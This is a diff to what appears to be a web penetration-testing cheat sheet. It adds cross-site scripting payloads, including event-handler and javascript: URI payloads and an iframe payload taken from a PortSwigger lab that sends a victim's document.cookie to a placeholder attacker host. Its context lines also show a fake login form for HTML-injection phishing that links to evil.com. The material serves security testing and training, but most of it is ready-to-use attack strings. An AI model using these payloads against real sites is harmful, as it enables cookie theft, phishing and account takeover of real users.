@@ -2867,6 +2867,9 @@ Manually testing for XXE vulnerabilities generally involves
 - Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`
 
 #### <ins>Payloads</ins>
+- `" onload=alert() alt="`
+- `<img src=x onerror=alert()>`
+- `javascript:alert(document.cookie)`
 - HTML injection
   - ```HTML
     <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
@@ -2935,6 +2938,9 @@ Manually testing for XXE vulnerabilities generally involves
 - ```HTML
   %00%22%3E%3Cimg%20src%3da%20onerror%3dconfirm(document.domain)%3E
   ```
+- [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
+  - `<iframe src="https://VICTIM.net/#" onload=this.src='http://ATTACKER/?x='+document.cookie;></iframe>`
+  - `<iframe src="https://VICTIM.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
 
 #### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
 - Change email > Password reset
